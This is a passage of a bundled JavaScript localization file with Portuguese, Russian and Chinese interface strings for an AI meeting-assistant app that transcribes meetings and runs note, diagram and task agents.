novo\",\"start\":\"Começar\",\"titleLabel\":\"Título da reunião\",\"toggleNote\":\"A minha nota\",\"toggleTasks\":\"Tarefas\",\"toggleTranslation\":\"Tradução\",\"unpause\":\"Retomar\"},\"note\":{\"close\":\"Fechar a nota\",\"edit\":\"Editar\",\"editorLabel\":\"Texto da nota\",\"hint\":\"É guardada automaticamente enquanto escreve.\",\"loadFailed\":\"Não foi possível ler a sua nota do disco. A edição está em pausa para não substituir nada: feche e volte a abrir o painel para tentar novamente.\",\"loading\":\"A carregar a sua nota…\",\"paused\":\"Edição em pausa\",\"placeholder\":\"Escreva aqui as suas notas. O Markdown é suportado.\",\"preview\":\"Pré-visualizar\",\"saved\":\"Guardada\",\"saving\":\"A guardar…\",\"title\":\"A minha nota\",\"unsaved\":\"Alterações não guardadas\",\"uploading\":\"A adicionar a imagem…\"},\"pillBar\":{\"addLink\":\"Adicionar um link\",\"agentMuted\":\"{{name}} não está à escuta\",\"attachmentsMenu\":\"Anexos\",\"createPreset\":\"Criar uma predefinição\",\"disableAgent\":\"Desativar {{name}}\",\"enableAgent\":\"Ativar {{name}}\",\"listening\":\"À escuta\",\"manageAgents\":\"Gerir os agentes\",\"manageAttachments\":\"Gerir os anexos\",\"noAttachments\":\"Sem anexos\",\"noPreset\":\"Sem predefinição\",\"presetDefaultOption\":\"{{name}} (predefinida)\",\"presetLabel\":\"Predefinição de agentes\",\"removeAttachment\":\"Remover {{label}}\",\"usingDefaultPreset\":\"A usar a predefinição padrão\"},\"priority\":{\"high\":\"Alta\",\"low\":\"Baixa\",\"medium\":\"Média\"},\"review\":{\"allDone\":\"Tudo revisto\",\"archive\":\"Arquivar\",\"archiveAll\":\"Arquivar o resto\",\"archiveOthers_many\":\"Arquivar as outras {{count}}\",\"archiveOthers_one\":\"Arquivar a outra {{count}}\",\"archiveOthers_other\":\"Arquivar as outras {{count}}\",\"archiveSkipsFiling\":\"Itens sendo registrados são ignorados\",\"archivedSection\":\"Arquivadas\",\"assignedTo\":\"Atribuída a {{name}}\",\"backToMeeting\":\"Voltar à reunião\",\"closeBlocked_many\":\"{{count}} continuam sem decisão\",\"closeBlocked_one\":\"{{count}} continua sem decisão\",\"closeBlocked_other\":\"{{count}} continuam sem decisão\",\"closeMeeting\":\"Fechar a reunião\",\"file\":\"Registar\",\"filedSection\":\"Registadas em {{provider}}\",\"filing\":\"A registar…\",\"nothingPending\":\"Não resta nada para revisar\",\"nothingPendingHint\":\"Todas as tarefas foram registadas ou arquivadas.\",\"pendingSection\":\"Pendentes\",\"remaining_many\":\"faltam {{count}} para revisar\",\"remaining_one\":\"falta {{count}} para revisar\",\"remaining_other\":\"faltam {{count}} para revisar\",\"statArchived\":\"Arquivadas\",\"statFiled\":\"Registadas\",\"statPending\":\"Pendentes\",\"title\":\"Revisão de tarefas\",\"unarchive\":\"Restaurar\"},\"session\":{\"agentToggleFailed\":\"Não foi possível alterar esse agente.\",\"agentsResumed\":\"Os agentes voltaram a funcionar.\",\"anotherMeetingActive\":\"Já está a decorrer outra reunião. Termine-a primeiro.\",\"anotherMeetingActiveNamed\":\"“{{title}}” ainda está a decorrer. Abra-a em Reuniões e escolha primeiro “Terminar e revisar”.\",\"anotherMeetingReviewing\":\"“{{title}}” ainda está em revisão. Abra-a em Reuniões e escolha primeiro “Fechar a reunião”.\",\"attachmentFailed\":\"Não foi possível atualizar os anexos.\",\"broadcastFailed\":\"Não foi possível contactar os agentes.\",\"broadcastSent\":\"Enviado aos agentes à escuta.\",\"ended\":\"Reunião terminada.\",\"messageFailed\":\"Não foi possível enviar essa mensagem.\",\"minutesRevertFailed\":\"Não foi possível descartar suas edições.\",\"minutesSaveFailed\":\"Não foi possível salvar suas edições.\",\"noteImageFailed\":\"Não foi possível adicionar essa imagem. Cole um PNG, JPEG, GIF ou WebP.\",\"noteImageTooLarge\":\"Essa imagem é demasiado grande para uma nota.\",\"noteSaveFailed\":\"Não foi possível guardar a sua nota.\",\"openVoiceSettings\":\"Abrir configurações de voz\",\"renameFailed\":\"Não foi possível renomear a reunião.\",\"startFailed\":\"Não foi possível iniciar a reunião.\",\"started\":\"Reunião iniciada.\",\"statusFailed\":\"Não foi possível alterar o estado da reunião.\",\"stopFailed\":\"Não foi possível terminar a reunião.\",\"sttConnectionFailed\":\"Não foi possível ligar à transcrição.\",\"sttDisconnected\":\"A transcrição desligou-se.\",\"sttDispatchFailed\":\"Não foi possível entregar um segmento da transcrição aos agentes.\",\"sttMicDenied\":\"O acesso ao microfone foi recusado.\",\"sttStreamingDisabled\":\"A transcrição ao vivo está desativada. Em Configurações → Voz, verifique se a entrada de voz está ativada, se o provedor suporta streaming e se Streaming está ativado.\",\"sttUnavailable\":\"A transcrição não está disponível.\",\"sttUnsupported\":\"Este navegador não consegue gravar áudio.\",\"sttWorkletFailed\":\"Não foi possível iniciar o processador de áudio.\",\"taskAddFailed\":\"Não foi possível adicionar essa tarefa.\",\"taskFileFailed\":\"Não foi possível registar essa tarefa.\",\"taskFiled\":\"Tarefa registada.\",\"untitled\":\"Reunião sem título\"},\"settings\":{\"addTerm\":\"Adicionar\",\"agentsHelp\":\"Que agentes uma reunião oferece, e quais deles começam ativos.\",\"agentsTitle\":\"Agentes\",\"aliasesLabel\":\"Formas mal ouvidas\",\"aliasesPlaceholder\":\"O que a transcrição ouve, separado por vírgulas…\",\"back\":\"Voltar\",\"calendarHelp\":\"De onde são lidas as próximas reuniões.\",\"calendarProviderLabel\":\"Fornecedor de calendário\",\"calendarSourceHint\":\"Um caminho para um arquivo .ics local, ou um URL https que aponte para um.\",\"calendarSourceLabel\":\"Origem do calendário\",\"calendarSourcePlaceholder\":\"Caminho ou URL de um arquivo .ics…\",\"calendarTitle\":\"Calendário\",\"correctLabel\":\"Termo correto\",\"correctPlaceholder\":\"O que deveria dizer…\",\"dictionaryHelp\":\"Corrija uma vez um erro recorrente da transcrição e todas as reuniões seguintes acertam.\",\"dictionaryTitle\":\"Dicionário de voz\",\"enabledByDefault\":\"Ativar {{name}} por predefinição\",\"noTerms\":\"Ainda sem correções\",\"noTermsHint\":\"Escreva à esquerda o que a transcrição ouve mal, e à direita o que deveria dizer.\",\"removeTerm\":\"Remover {{term}}\",\"saveFailed\":\"Não foi possível guardar as definições.\",\"saveSource\":\"Guardar\",\"saved\":\"Guardado.\",\"subtitle\":\"Fornecedores, agentes e o dicionário de voz\",\"taskProviderHelp\":\"Onde são registadas as tarefas revistas.\",\"taskProviderTitle\":\"Fornecedor de tarefas\",\"termFailed\":\"Não foi possível adicionar essa correção.\",\"termIncomplete\":\"Escreva o que foi ouvido e o que deveria dizer.\",\"title\":\"Definições de Reuniões\",\"translationHelp\":\"Traduz cada linha falada para outro idioma, mostrada num painel lateral durante a reunião. Consome uma chamada ao modelo por linha, pelo que está desativada por predefinição.\",\"translationOff\":\"Desativada\",\"translationTitle\":\"Tradução em direto\"},\"taskSidebar\":{\"add\":\"Adicionar\",\"assigneeLabel\":\"Responsável\",\"close\":\"Fechar as tarefas\",\"deleteTask\":\"Eliminar esta tarefa\",\"descriptionLabel\":\"Tarefa\",\"empty\":\"Ainda não foi extraído nada.\",\"filed\":\"Registada\",\"heading_many\":\"{{count}} tarefas\",\"heading_one\":\"{{count}} tarefa\",\"heading_other\":\"{{count}} tarefas\",\"priorityLabel\":\"Prioridade\",\"quickAddPlaceholder\":\"Adicionar uma tarefa…\",\"title\":\"Tarefas\",\"unassigned\":\"Sem responsável\"},\"transcript\":{\"empty\":\"Ainda não há transcrição\",\"emptyHintLive\":\"A fala finalizada aparecerá aqui à medida que a reunião avança.\",\"emptyHintPaused\":\"Pausado — a fala aparecerá aqui após retomar.\",\"emptyHintRecorded\":\"Nenhuma transcrição foi gravada para esta reunião.\",\"full\":\"A transcrição está cheia. Novas falas e transmissões não serão mais gravadas nem enviadas aos agentes.\",\"jumpToLatest\":\"Ir para o mais recente\",\"live\":\"Ao vivo\",\"regionLabel\":\"Transcrição da reunião\",\"title\":\"Transcrição\",\"typed\":\"Digitado\"},\"translation\":{\"close\":\"Fechar a tradução\",\"dropped\":\"Algumas linhas foram ignoradas para acompanhar o ritmo.\",\"empty\":\"Ainda nada traduzido\",\"emptyHint\":\"As linhas aparecem aqui à medida que se fala.\",\"lineFailed\":\"Não foi possível traduzir esta linha.\",\"loading\":\"A carregar…\",\"pending\":\"A recuperar…\",\"title\":\"Tradução\"},\"widgetType\":{\"chat\":\"Conversa\",\"html\":\"Diagrama\",\"markdown\":\"Notas\"}}}"),
		components: { "confirmDialog": { "cancel": "Cancelar" } }
	},
	ru: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"Результат агента «{{name}}» появится здесь.\",\"cancel\":\"Отмена\",\"chatEmpty\":\"Агенту «{{name}}» пока ничего не отправлено.\",\"collapse\":\"Вернуть {{name}} в раздельный вид\",\"diagramFrameTitle\":\"Схема агента «{{name}}»\",\"discardDraft\":\"Отменить несохранённые изменения\",\"discardDraftHint\":\"Несохранённые изменения будут безвозвратно удалены.\",\"edit\":\"Изменить этот вывод\",\"edited\":\"Изменено\",\"editorLabel\":\"Вывод {{name}}, доступен для редактирования\",\"expand\":\"Развернуть {{name}}\",\"listeningHint\":\"Слушает встречу\",\"messagePlaceholder\":\"Сообщение агенту «{{name}}»…\",\"mute\":\"Отключить звук у «{{name}}»\",\"mutedHint\":\"Не слушает встречу\",\"revert\":\"Сбросить мои правки\",\"revertHint\":\"Безвозвратно удалить мои правки и показать то, что написал {{name}}\",\"save\":\"Сохранить\",\"saving\":\"Сохранение…\",\"send\":\"Отправить\",\"showChat\":\"Показать переписку\",\"showOutput\":\"Показать результат\",\"staleEdit\":\"{{name}} написал ещё после твоей правки. Показана твоя версия; сбрось свои правки, чтобы увидеть его вариант.\",\"unmute\":\"Включить звук у «{{name}}»\"},\"broadcastBar\":{\"heard\":\"Услышано: {{text}}\",\"pausedPlaceholder\":\"Агенты приостановлены — возобновите, чтобы отправить\",\"pausingPlaceholder\":\"Приостановка — отправка недоступна\",\"placeholder\":\"Скажите что-нибудь всем слушающим агентам…\",\"resumingPlaceholder\":\"Возобновление — отправка скоро будет доступна\",\"send\":\"Отправить\"},\"list\":{\"adHocTitle\":\"Внеплановая встреча\",\"deleteConfirm\":\"Удалить «{{title}}» вместе со всеми заметками, схемами и задачами? Это действие нельзя отменить.\",\"deleteFailed\":\"Не удалось удалить эту встречу.\",\"deleteMeeting\":\"Удалить «{{title}}»\",\"deleteUnavailable\":\"Завершите встречу перед удалением\",\"deleted\":\"Встреча «{{title}}» удалена\",\"empty\":\"Встреч нет\",\"emptyHintNoCalendar\":\"Подключите календарь в настройках или начните внеплановую встречу.\",\"emptyHintSynced\":\"В календаре ничего нет, и ни одна встреча ещё не обработана.\",\"filterPlaceholder\":\"Фильтр встреч…\",\"hasNotes\":\"Есть заметки\",\"liveBanner\":\"«{{title}}» идёт сейчас\",\"newMeeting\":\"Новая встреча\",\"returnToMeeting\":\"Вернуться к встрече\",\"reviewing\":\"На проверке\",\"reviewingBanner\":\"«{{title}}» ждёт проверки задач\",\"sectionTitle\":\"Все встречи\",\"settings\":\"Настройки\",\"statLive\":\"Идут сейчас\",\"statScheduled\":\"Запланировано\",\"statWorked\":\"Обработано\",\"subtitle\":\"Заметки, схемы и задачи в реальном времени, пока идёт встреча\",\"syncCalendar\":\"Синхронизировать календарь\",\"syncFailed\":\"Не удалось синхронизировать календарь.\",\"synced_few\":\"Синхронизировано {{count}} события\",\"synced_many\":\"Синхронизировано {{count}} событий\",\"synced_one\":\"Синхронизировано {{count}} событие\",\"synced_other\":\"Синхронизировано {{count}} события\",\"title\":\"Встречи\"},\"manifest\":{\"configuration_1\":\"Разрешите браузеру доступ к микрофону для живой записи; при желании настройте в Settings путь или URL iCalendar, локальный журнал задач, роли агентов и термины для исправления распознавания речи.\",\"description\":\"Помощник по встречам на базе ИИ. Расшифровывает встречу в реальном времени, по ходу ведёт структурированные заметки и схемы, вытаскивает задачи и даёт просмотреть их перед регистрацией.\",\"display_name\":\"Встречи\",\"highlight_1\":\"Расшифровка в реальном времени через собственное распознавание речи Kiro Crew — без отдельного демона и без облачного аккаунта сверх того, что уже используется\",\"highlight_2\":\"Команда агентов работает над встречей параллельно: структурированные заметки, схема HTML/Mermaid и список задач\",\"highlight_3\":\"Исправь повторяющиеся ошибки распознавания речи один раз в словаре терминов — и на всех следующих встречах они будут верными\",\"highlight_4\":\"Просмотри извлечённые задачи до того, как что-то будет зарегистрировано — лишнее в архив, остальное в работу\",\"highlight_5\":\"Подключаемые провайдеры задач и календарей: в комплекте локальный журнал задач и чтение iCalendar (.ics), а организация может зарегистрировать свои\",\"highlight_6\":\"Читай расшифровку строка за строкой на другом языке, пока идёт встреча\",\"highlight_7\":\"Веди собственные заметки рядом с заметками агентов — вставь скриншот, и он сохранится с прошедшим временем встречи\",\"page_label\":\"Встречи\",\"use_case_1\":\"Записывайте встречу, пока параллельные агенты создают расшифровку, структурированные заметки, диаграмму и список задач для проверки.\"},\"meeting\":{\"agentsPaused\":\"Агенты остановились после нескольких сбоев.\",\"attachPrompt\":\"Вставьте ссылку, чтобы поделиться с агентами\",\"back\":\"Назад\",\"endAndReview\":\"Завершить и проверить\",\"ended\":\"Завершена\",\"endingReview\":\"Завершение — подготовка обзора…\",\"live\":\"Идёт\",\"loadFailed\":\"Не удалось открыть эту встречу\",\"moreActions\":\"Другие действия\",\"noAgents\":\"Ни один агент не включён\",\"noAgentsHint\":\"Включите агента на панели выше или выберите набор.\",\"pause\":\"Приостановить\",\"paused\":\"Приостановлена\",\"pausing\":\"Приостановка…\",\"refresh\":\"Обновить\",\"restart\":\"Запустить заново\",\"resuming\":\"Возобновление…\",\"retryAgents\":\"Повторить\",\"start\":\"Начать\",\"titleLabel\":\"Название встречи\",\"toggleNote\":\"Моя заметка\",\"toggleTasks\":\"Задачи\",\"toggleTranslation\":\"Перевод\",\"unpause\":\"Продолжить\"},\"note\":{\"close\":\"Закрыть заметку\",\"edit\":\"Редактировать\",\"editorLabel\":\"Текст заметки\",\"hint\":\"Сохраняется автоматически по мере ввода.\",\"loadFailed\":\"Не удалось прочитать заметку с диска. Редактирование приостановлено, чтобы ничего не перезаписать: закрой и снова открой панель, чтобы повторить попытку.\",\"loading\":\"Загрузка заметки…\",\"paused\":\"Редактирование приостановлено\",\"placeholder\":\"Пиши здесь свои заметки. Поддерживается Markdown.\",\"preview\":\"Предпросмотр\",\"saved\":\"Сохранено\",\"saving\":\"Сохранение...\",\"title\":\"Моя заметка\",\"unsaved\":\"Несохранённые изменения\",\"uploading\":\"Добавление изображения...\"},\"pillBar\":{\"addLink\":\"Добавить ссылку\",\"agentMuted\":\"«{{name}}» не слушает\",\"attachmentsMenu\":\"Вложения\",\"createPreset\":\"Создать набор\",\"disableAgent\":\"Выключить «{{name}}»\",\"enableAgent\":\"Включить «{{name}}»\",\"listening\":\"Слушает\",\"manageAgents\":\"Управление агентами\",\"manageAttachments\":\"Управление вложениями\",\"noAttachments\":\"Вложений нет\",\"noPreset\":\"Без набора\",\"presetDefaultOption\":\"{{name}} (по умолчанию)\",\"presetLabel\":\"Набор агентов\",\"removeAttachment\":\"Удалить «{{label}}»\",\"usingDefaultPreset\":\"Используется набор по умолчанию\"},\"priority\":{\"high\":\"Высокий\",\"low\":\"Низкий\",\"medium\":\"Средний\"},\"review\":{\"allDone\":\"Всё проверено\",\"archive\":\"В архив\",\"archiveAll\":\"Остальное в архив\",\"archiveOthers_few\":\"Остальные ({{count}}) в архив\",\"archiveOthers_many\":\"Остальные ({{count}}) в архив\",\"archiveOthers_one\":\"Остальные ({{count}}) в архив\",\"archiveOthers_other\":\"Остальные ({{count}}) в архив\",\"archiveSkipsFiling\":\"Задачи, которые сейчас отправляются, пропускаются\",\"archivedSection\":\"В архиве\",\"assignedTo\":\"Назначено: {{name}}\",\"backToMeeting\":\"Вернуться к встрече\",\"closeBlocked_few\":\"{{count}} задачи ещё ждут решения\",\"closeBlocked_many\":\"{{count}} задач ещё ждут решения\",\"closeBlocked_one\":\"{{count}} задача ещё ждёт решения\",\"closeBlocked_other\":\"{{count}} задачи ещё ждут решения\",\"closeMeeting\":\"Закрыть встречу\",\"file\":\"Зарегистрировать\",\"filedSection\":\"Зарегистрировано в {{provider}}\",\"filing\":\"Регистрация…\",\"nothingPending\":\"Проверять больше нечего\",\"nothingPendingHint\":\"Каждая задача зарегистрирована или отправлена в архив.\",\"pendingSection\":\"Ожидают решения\",\"remaining_few\":\"осталось проверить {{count}}\",\"remaining_many\":\"осталось проверить {{count}}\",\"remaining_one\":\"осталось проверить {{count}}\",\"remaining_other\":\"осталось проверить {{count}}\",\"statArchived\":\"В архиве\",\"statFiled\":\"Зарегистрировано\",\"statPending\":\"Ожидают\",\"title\":\"Проверка задач\",\"unarchive\":\"Восстановить\"},\"session\":{\"agentToggleFailed\":\"Не удалось изменить этого агента.\",\"agentsResumed\":\"Агенты снова работают.\",\"anotherMeetingActive\":\"Уже идёт другая встреча. Сначала завершите её.\",\"anotherMeetingActiveNamed\":\"«{{title}}» ещё идёт. Открой её в разделе «Встречи» и сначала выбери «Завершить и проверить».\",\"anotherMeetingReviewing\":\"«{{title}}» ещё на проверке. Открой её в разделе «Встречи» и сначала выбери «Закрыть встречу».\",\"attachmentFailed\":\"Не удалось обновить вложения.\",\"broadcastFailed\":\"Не удалось связаться с агентами.\",\"broadcastSent\":\"Отправлено слушающим агентам.\",\"ended\":\"Встреча завершена.\",\"messageFailed\":\"Не удалось отправить это сообщение.\",\"minutesRevertFailed\":\"Не удалось сбросить твои правки.\",\"minutesSaveFailed\":\"Не удалось сохранить твои правки.\",\"noteImageFailed\":\"Не удалось добавить это изображение. Вставь PNG, JPEG, GIF или WebP.\",\"noteImageTooLarge\":\"Это изображение слишком большое для заметки.\",\"noteSaveFailed\":\"Не удалось сохранить заметку.\",\"openVoiceSettings\":\"Открыть настройки голоса\",\"renameFailed\":\"Не удалось переименовать встречу.\",\"startFailed\":\"Не удалось начать встречу.\",\"started\":\"Встреча началась.\",\"statusFailed\":\"Не удалось изменить состояние встречи.\",\"stopFailed\":\"Не удалось завершить встречу.\",\"sttConnectionFailed\":\"Не удалось подключиться к расшифровке речи.\",\"sttDisconnected\":\"Расшифровка речи отключилась.\",\"sttDispatchFailed\":\"Не удалось передать агентам фрагмент расшифровки.\",\"sttMicDenied\":\"Доступ к микрофону запрещён.\",\"sttStreamingDisabled\":\"Живая расшифровка выключена. В Настройки → Голос проверь, что голосовой ввод включён, провайдер поддерживает потоковую передачу и Streaming включён.\",\"sttUnavailable\":\"Расшифровка речи недоступна.\",\"sttUnsupported\":\"Этот браузер не может записывать звук.\",\"sttWorkletFailed\":\"Не удалось запустить обработку звука.\",\"taskAddFailed\":\"Не удалось добавить эту задачу.\",\"taskFileFailed\":\"Не удалось зарегистрировать эту задачу.\",\"taskFiled\":\"Задача зарегистрирована.\",\"untitled\":\"Встреча без названия\"},\"settings\":{\"addTerm\":\"Добавить\",\"agentsHelp\":\"Какие агенты доступны на встрече и какие из них включены с самого начала.\",\"agentsTitle\":\"Агенты\",\"aliasesLabel\":\"Ошибочные варианты\",\"aliasesPlaceholder\":\"Что слышит расшифровка, через запятую…\",\"back\":\"Назад\",\"calendarHelp\":\"Откуда читаются предстоящие встречи.\",\"calendarProviderLabel\":\"Поставщик календаря\",\"calendarSourceHint\":\"Путь к локальному файлу .ics или https-ссылка на такой файл.\",\"calendarSourceLabel\":\"Источник календаря\",\"calendarSourcePlaceholder\":\"Путь или ссылка на файл .ics…\",\"calendarTitle\":\"Календарь\",\"correctLabel\":\"Правильный термин\",\"correctPlaceholder\":\"Как должно быть…\",\"dictionaryHelp\":\"Исправьте повторяющуюся ошибку расшифровки один раз — и все последующие встречи запишут её верно.\",\"dictionaryTitle\":\"Словарь речи\",\"enabledByDefault\":\"Включать «{{name}}» по умолчанию\",\"noTerms\":\"Исправлений пока нет\",\"noTermsHint\":\"Слева укажите, что расшифровка слышит неверно, а справа — как должно быть.\",\"removeTerm\":\"Удалить «{{term}}»\",\"saveFailed\":\"Не удалось сохранить настройки.\",\"saveSource\":\"Сохранить\",\"saved\":\"Сохранено.\",\"subtitle\":\"Поставщики, агенты и словарь речи\",\"taskProviderHelp\":\"Куда попадают проверенные задачи.\",\"taskProviderTitle\":\"Поставщик задач\",\"termFailed\":\"Не удалось добавить это исправление.\",\"termIncomplete\":\"Укажите, что было услышано и как должно быть.\",\"title\":\"Настройки встреч\",\"translationHelp\":\"Переводит каждую произнесённую строку на другой язык и показывает её на боковой панели во время встречи. Расходует один вызов модели на строку, поэтому по умолчанию отключён.\",\"translationOff\":\"Отключён\",\"translationTitle\":\"Перевод в реальном времени\"},\"taskSidebar\":{\"add\":\"Добавить\",\"assigneeLabel\":\"Исполнитель\",\"close\":\"Закрыть задачи\",\"deleteTask\":\"Удалить эту задачу\",\"descriptionLabel\":\"Задача\",\"empty\":\"Пока ничего не найдено.\",\"filed\":\"Зарегистрирована\",\"heading_few\":\"{{count}} задачи\",\"heading_many\":\"{{count}} задач\",\"heading_one\":\"{{count}} задача\",\"heading_other\":\"{{count}} задачи\",\"priorityLabel\":\"Приоритет\",\"quickAddPlaceholder\":\"Добавить задачу…\",\"title\":\"Задачи\",\"unassigned\":\"Без исполнителя\"},\"transcript\":{\"empty\":\"Стенограммы пока нет\",\"emptyHintLive\":\"Окончательный текст речи будет появляться здесь по ходу встречи.\",\"emptyHintPaused\":\"Приостановлено — речь появится здесь после возобновления.\",\"emptyHintRecorded\":\"Для этой встречи стенограмма не записывалась.\",\"full\":\"Стенограмма заполнена. Новая речь и сообщения больше не записываются и не отправляются агентам.\",\"jumpToLatest\":\"К последним записям\",\"live\":\"В эфире\",\"regionLabel\":\"Стенограмма встречи\",\"title\":\"Стенограмма\",\"typed\":\"Введено\"},\"translation\":{\"close\":\"Закрыть перевод\",\"dropped\":\"Часть строк пропущена, чтобы не отставать.\",\"empty\":\"Пока ничего не переведено\",\"emptyHint\":\"Строки появляются здесь по ходу разговора.\",\"lineFailed\":\"Не удалось перевести эту строку.\",\"loading\":\"Загрузка...\",\"pending\":\"Догоняем...\",\"title\":\"Перевод\"},\"widgetType\":{\"chat\":\"Переписка\",\"html\":\"Схема\",\"markdown\":\"Заметки\"}}}"),
		components: { "confirmDialog": { "cancel": "Отмена" } }
	},
	"zh-CN": {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}} 的输出将显示在这里。\",\"cancel\":\"取消\",\"chatEmpty\":\"还没有向 {{name}} 发送任何内容。\",\"collapse\":\"将 {{name}} 恢复为并排布局\",\"diagramFrameTitle\":\"{{name}} 的图示\",\"discardDraft\":\"放弃未保存的更改\",\"discardDraftHint\":\"未保存的更改将被永久删除。\",\"edit\":\"编辑此输出\",\"edited\":\"已编辑\",\"editorLabel\":\"{{name}} 的输出，可编辑\",\"expand\":\"展开 {{name}}\",\"listeningHint\":\"正在聆听会议\",\"messagePlaceholder\":\"发消息给 {{name}}……\",\"mute\":\"静音 {{name}}\",\"mutedHint\":\"未在聆听会议\",\"revert\":\"放弃我的修改\",\"revertHint\":\"永久删除我的修改，显示 {{name}} 写的内容\",\"save\":\"保存\",\"saving\":\"保存中…\",\"send\":\"发送\",\"showChat\":\"显示对话\",\"showOutput\":\"显示输出\",\"staleEdit\":\"在你编辑之后，{{name}} 又写了新内容。当前显示你的版本；放弃修改即可查看它写的内容。\",\"unmute\":\"取消静音 {{name}}\"},\"broadcastBar\":{\"heard\":\"听到：{{text}}\",\"pausedPlaceholder\":\"助手已暂停 — 继续后才能发送\",\"pausingPlaceholder\":\"正在暂停 — 暂时无法发送\",\"placeholder\":\"对所有正在聆听的代理说点什么……\",\"resumingPlaceholder\":\"正在继续 — 马上就能发送\",\"send\":\"发送\"},\"list\":{\"adHocTitle\":\"临时会议\",\"deleteConfirm\":\"要删除“{{title}}”及其所有笔记、图示和行动项吗？此操作无法撤销。\",\"deleteFailed\":\"无法删除此会议。\",\"deleteMeeting\":\"删除“{{title}}”\",\"deleteUnavailable\":\"请先结束此会议再将其删除\",\"deleted\":\"已删除“{{title}}”\",\"empty\":\"没有会议\",\"emptyHintNoCalendar\":\"在设置中连接日历，或者开一个临时会议。\",\"emptyHintSynced\":\"日历中没有内容，也还没有处理过任何会议。\",\"filterPlaceholder\":\"筛选会议……\",\"hasNotes\":\"有笔记\",\"liveBanner\":\"“{{title}}”正在进行\",\"newMeeting\":\"新建会议\",\"returnToMeeting\":\"返回会议\",\"reviewing\":\"待复核\",\"reviewingBanner\":\"“{{title}}”正在等待行动项复核\",\"sectionTitle\":\"所有会议\",\"settings\":\"设置\",\"statLive\":\"进行中\",\"statScheduled\":\"已排期\",\"statWorked\":\"已处理\",\"subtitle\":\"会议进行时实时生成笔记、图示和行动项\",\"syncCalendar\":\"同步日历\",\"syncFailed\":\"无法同步日历。\",\"synced_other\":\"已同步 {{count}} 个日程\",\"title\":\"会议\"},\"manifest\":{\"configuration_1\":\"实时录音需要允许浏览器访问麦克风；还可在设置中配置 iCalendar 路径或 URL、本地任务账本、代理角色和语音纠错词。\",\"description\":\"AI 会议助手。实时转录会议，边开边整理结构化笔记和图示，提取行动项，并让你在提交之前先过一遍。\",\"display_name\":\"会议\",\"highlight_1\":\"用 Kiro Crew 自带的语音转文字做实时转录 — 不需要额外守护进程，也不需要你现有之外的云账号\",\"highlight_2\":\"一组代理并行处理会议：结构化笔记、HTML/Mermaid 图示，以及行动项清单\",\"highlight_3\":\"用领域词典把反复出现的语音转文字错误纠正一次，之后每场会议都能认对\",\"highlight_4\":\"在提交任何内容之前先审阅提取出的行动项 — 噪音归档，其余提交\",\"highlight_5\":\"任务和日历提供方可插拔：内置本地任务账本和 iCalendar（.ics）读取器，组织也可以注册自己的实现\",\"highlight_6\":\"会议进行时，逐行用另一种语言读回转录内容\",\"highlight_7\":\"在智能体笔记旁边记录你自己的笔记 — 粘贴截图后会附上会议进行到的时间\",\"page_label\":\"会议\",\"use_case_1\":\"在实时会议中，由多个代理并行生成转录、结构化笔记、图示和待审阅的行动项。\"},\"meeting\":{\"agentsPaused\":\"多次失败后，代理已停止。\",\"attachPrompt\":\"粘贴要分享给智能体的链接\",\"back\":\"返回\",\"endAndReview\":\"结束并复核\",\"ended\":\"已结束\",\"endingReview\":\"正在结束 — 准备审阅…\",\"live\":\"进行中\",\"loadFailed\":\"无法打开这场会议\",\"moreActions\":\"更多操作\",\"noAgents\":\"没有启用任何代理\",\"noAgentsHint\":\"在上方栏中启用一个，或选择一个预设。\",\"pause\":\"暂停\",\"paused\":\"已暂停\",\"pausing\":\"正在暂停…\",\"refresh\":\"刷新\",\"restart\":\"重新开始\",\"resuming\":\"正在继续…\",\"retryAgents\":\"重试\",\"start\":\"开始\",\"titleLabel\":\"会议标题\",\"toggleNote\":\"我的笔记\",\"toggleTasks\":\"行动项\",\"toggleTranslation\":\"翻译\",\"unpause\":\"继续\"},\"note\":{\"close\":\"关闭笔记\",\"edit\":\"编辑\",\"editorLabel\":\"笔记内容\",\"hint\":\"输入时自动保存。\",\"loadFailed\":\"无法从磁盘读取你的笔记。为避免覆盖，编辑已暂停——关闭并重新打开面板即可重试。\",\"loading\":\"正在加载你的笔记…\",\"paused\":\"编辑已暂停\",\"placeholder\":\"在此记下你自己的笔记。支持 Markdown。\",\"preview\":\"预览\",\"saved\":\"已保存\",\"saving\":\"正在保存…\",\"title\":\"我的笔记\",\"unsaved\":\"有未保存的更改\",\"uploading\":\"正在添加图片…\"},\"pillBar\":{\"addLink\":\"添加链接\",\"agentMuted\":\"{{name}} 未在聆听\",\"attachmentsMenu\":\"附件\",\"createPreset\":\"创建预设\",\"disableAgent\":\"关闭 {{name}}\",\"enableAgent\":\"启用 {{name}}\",\"listening\":\"正在聆听\",\"manageAgents\":\"管理代理\",\"manageAttachments\":\"管理附件\",\"noAttachments\":\"没有附件\",\"noPreset\":\"不使用预设\",\"presetDefaultOption\":\"{{name}}（默认）\",\"presetLabel\":\"代理预设\",\"removeAttachment\":\"移除 {{label}}\",\"usingDefaultPreset\":\"正在使用默认预设\"},\"priority\":{\"high\":\"高\",\"low\":\"低\",\"medium\":\"中\"},\"review\":{\"allDone\":\"全部已复核\",\"archive\":\"归档\",\"archiveAll\":\"归档其余\",\"archiveOthers_other\":\"归档其余 {{count}} 项\",\"archiveSkipsFiling\":\"正在提交的条目会被跳过\",\"archivedSection\":\"已归档\",\"assignedTo\":\"负责人：{{name}}\",\"backToMeeting\":\"返回会议\",\"closeBlocked_other\":\"还有 {{count}} 项待决定\",\"closeMeeting\":\"关闭会议\",\"file\":\"提交\",\"filedSection\":\"已提交至 {{provider}}\",\"filing\":\"正在提交……\",\"nothingPending\":\"没有待复核的内容\",\"nothingPendingHint\":\"每个行动项都已提交或归档。\",\"pendingSection\":\"待处理\",\"remaining_other\":\"还有 {{count}} 